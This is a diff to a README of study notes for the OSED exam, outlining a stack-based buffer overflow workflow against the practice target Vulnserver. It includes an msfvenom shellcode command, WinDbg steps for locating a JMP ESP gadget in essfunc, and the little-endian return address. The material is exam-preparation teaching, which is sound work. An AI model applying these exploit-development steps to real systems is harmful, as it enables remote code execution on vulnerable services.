@@ -1,10 +1,10 @@
 **OSEDLabHelpers**
 
 
-OSED study notes,using Vulnserver as a test case.
+OSED study notes,Stack based overflow using Vulnserver as a test case.
 A series of scripts; 
 
-1.Interactive Crash EIP Offset
+1.InteractiveCrash_EIP_Offset
 - Generates a cyclic pattern of any length.
 - Sends the pattern to a vulnerable service.
 - Prompts you for EIP after crash.
@@ -15,11 +15,25 @@ A series of scripts;
 
 2.Test_EIP_Overwrite
 
-3.Adding bad Chars
+3.BadCharsTest
 
-4.Generating Shellcode with MSFvenom
+4.Generating Shellcode with MSFvenom,manual process to create the folling shellcode;
 
  - msfvenom -p windows/exec CMD=calc.exe -b "\x00" -f python EXITFUNC=thread
  - Copy the code into the shellcode portion of the final script
-   
-5.Final Script
+
+5.Finding JMP ESP cmd in module ,manaul process in WinDbg;
+- Attach to Vulnserver process,then lm (to load the modules)
+-start    end        module name
+62500000 62600000   essfunc
+77c10000 77d90000   ntdll
+...
+- scan the module for jmp esp;
+  s -b 62500000 L100000 ff e4
+(ff e4 opcode for jmp esp)
+result - 625011AF  ff e4  JMP ESP
+-disassemble to be sure; u 625011af
+- add address to code - BUT MAKE SURE CONVERT TO LITTLE ENDIAN!!
+  So; JMP_ESP = b"\xAF\x11\x50\x62"  # 0x625011AF
+  
+6.Final Script
